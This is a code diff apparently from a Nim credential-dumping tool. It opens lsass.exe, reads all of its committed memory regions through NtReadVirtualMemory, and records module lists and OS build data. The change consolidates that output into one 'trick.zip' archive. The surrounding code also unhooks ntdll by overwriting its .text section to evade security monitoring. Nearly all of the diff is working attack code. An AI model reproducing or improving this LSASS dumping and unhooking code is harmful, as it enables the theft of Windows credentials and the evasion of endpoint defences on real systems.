@@ -196,28 +196,7 @@ proc getProcessByName*(procName: string): HANDLE =
     return 0
 
 
-proc GenerateZip*(zipFilename: string, memfiles: openArray[MemFile]) =
-  ## Crea un ZIP a partir de archivos en memoria usando Zippy (createZipArchive)
-  try:
-    var files = initTable[string, string]()
-
-    for memfile in memfiles:
-      if not memfile.content.isNil and memfile.size > 0:
-        let filename = memfile.filename
-        if filename.len > 0:
-          var data = newString(memfile.size)
-          copyMem(addr data[0], memfile.content, memfile.size)
-          files[filename] = data
-
-    let zipData = createZipArchive(files)
-    writeFile(zipFilename, zipData)
-
-    echo "[+] File ", zipFilename, "  generated correctly"
-  except:
-    echo "[-] Error al generar el ZIP"
-
-
-proc barrel*(hProcess: HANDLE, jsonFile: string, zipFile: string) =
+proc barrel*(hProcess: HANDLE): (string, array[MAX_MEMFILES, MemFile]) =
   # Initialize scan variables
   var
     memfileList: array[MAX_MEMFILES, MemFile]
@@ -245,18 +224,12 @@ proc barrel*(hProcess: HANDLE, jsonFile: string, zipFile: string) =
 
     if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
         let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
-        
         let regionSize = mbi.RegionSize
         let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
         var bytesRead: SIZE_T = 0
 
-        ### echo fmt"[+] Dumping {filename} ({regionSize} bytes)"
         let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
         let unsignedStatus = cast[uint32](status)
-        if mbi.Protect == 260 or mbi.Protect == 258:
-          echo "bbb"
-          echo "status ",status
-          echo "unsignedStatus ",unsignedStatus
 
         const STATUS_SUCCESS = 0x00000000'u32
         const STATUS_PARTIAL_COPY = 0x8000000D'u32
@@ -267,16 +240,6 @@ proc barrel*(hProcess: HANDLE, jsonFile: string, zipFile: string) =
             break
 
         jsonOutput.add(fmt"""{{"field0":"{filename}","field1":"0X{cast[int](mbi.BaseAddress):X}","field2":{regionSize}}},""")
-
-        ## DEBUG
-        var hexBytes = ""
-        if regionSize > 0:
-            hexBytes = newStringOfCap(36)  # 12 bytes * 3 caracteres (máximo)
-            for i in 0..<min(12, regionSize):
-                hexBytes.add(fmt"{buffer[i]:02X}")
-                if i < min(12, regionSize) - 1:  # Añadir espacio solo entre bytes
-                    hexBytes.add(" ")
-        #echo fmt"""{{"region":"{filename}","size":{regionSize},"first_bytes":"{hexBytes}"}}"""
 
         # Create MemFile
         if memfileCount < MAX_MEMFILES:
@@ -297,12 +260,11 @@ proc barrel*(hProcess: HANDLE, jsonFile: string, zipFile: string) =
 
   # Finalize JSON output (remove trailing comma and close array)
   if jsonOutput.len > 1:
-    jsonOutput.setLen(jsonOutput.len-2) # Remove last ", "
-  jsonOutput.add("}]")
-  writeFile(jsonFile, $jsonOutput)
-  echo "[+] File ", jsonFile, " generated correctly"
-
-  GenerateZip(zipFile, memfileList)
+    jsonOutput.setLen(jsonOutput.len-1) # Remove last ","
+  jsonOutput.add("]")
+  
+  # Return both the JSON string and the MemFile array
+  (jsonOutput, memfileList)
 
 
 proc findModuleByName*(moduleList: ptr ModuleInformation, listSize: int, auxName: array[MAX_PATH, char]): ModuleInformation =
@@ -411,7 +373,7 @@ proc customGetModuleHandle*(hProcess: HANDLE, moduleCount: ptr int): ptr ModuleI
   return moduleList
 
 
-proc shock*(hProcess: HANDLE, fileName: string) =
+proc shock*(hProcess: HANDLE): string =
   var moduleCounter: int = 0
   let moduleInformationList = customGetModuleHandle(hProcess, addr moduleCounter)
   echo "[+] Number of modules: ", moduleCounter
@@ -525,12 +487,7 @@ proc shock*(hProcess: HANDLE, fileName: string) =
       jsonItems.add(item)
 
   let finalJson = %jsonItems
-  try:
-    writeFile(filename, $finalJson)
-    echo "[+] File ", filename, " generated."
-
-  except IOError as e:
-    echo "[-] Error opening file ", filename, ": ", e.msg
+  return $finalJson
 
 
 proc getBuildNumber*(): OSVERSIONINFOEX =
@@ -540,12 +497,7 @@ proc getBuildNumber*(): OSVERSIONINFOEX =
   result = osVersionInfo
 
 
-proc writeToFile*(path: string, content: string) =
-  writeFile(path, content)
-  echo "[+] File ", path, " generated correctly"
-
-
-proc lock*(fileName: string) =
+proc lock*(): string =
   let osVersionInfo = getBuildNumber()
   let versionData = %*{
     "field0": $osVersionInfo.dwMajorVersion,
@@ -553,7 +505,7 @@ proc lock*(fileName: string) =
     "field2": $osVersionInfo.dwBuildNumber,
   }  
   let wrapper = %*[versionData]
-  writeToFile(fileName, $wrapper)
+  return $wrapper
 
 
 proc custom_get_module_address*(h_process: HANDLE, module_name: string): uint64 =
@@ -818,9 +770,33 @@ proc remap_library*() =
   replace_ntdll_txt_section(cast[pointer](unhookedNtdllTxt), localNtdllTxt, localNtdllTxtSize.uint32)
 
 
+proc GenerateZip*(zipFilename: string, lockJson: string, shockJson: string, barrelJson: string, memfiles: openArray[MemFile]) =
+  try:
+    var mainFiles = initTable[string, string]()    
+    mainFiles["lock.json"] = lockJson
+    mainFiles["shock.json"] = shockJson
+    mainFiles["barrel.json"] = barrelJson
+
+    var memoryFiles = initTable[string, string]()
+    for memfile in memfiles:
+      if not memfile.content.isNil and memfile.size > 0:
+        var data = newString(memfile.size)
+        copyMem(addr data[0], memfile.content, memfile.size)
+        memoryFiles[memfile.filename] = data
+    mainFiles["barrel.zip"] = createZipArchive(memoryFiles)
+
+    let zipData = createZipArchive(mainFiles)
+    writeFile(zipFilename, zipData)
+    echo "[+] File ", zipFilename," generated correctly"
+    
+  except Exception as e:
+    echo "[-] Error generating ZIP file: ", e.msg
+    quit(1)
+
+
 proc main() =
   var
-    zipFile = "barrel.zip"
+    zipFile = "trick.zip"
     shouldRemap = false
 
   for kind, key, val in getopt():
@@ -847,9 +823,14 @@ proc main() =
   let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
   if hProcess == 0:
     quit(-1)
-  lock("lock.json")
-  shock(hProcess, "shock.json")
-  barrel(hProcess, "barrel.json", "barrel.zip")
+  let lockJson = lock()
+  let shockJson = shock(hProcess)
+  let (barrelJson, memFiles) = barrel(hProcess)
+
+  #writeFile("lock.json", lockJson)
+  #writeFile("shock.json", shockJson)
+  #writeFile("barrel.json", barrelJson) 
+  GenerateZip(zipFile, lockJson, shockJson, barrelJson, memFiles)
 
 
 when isMainModule:
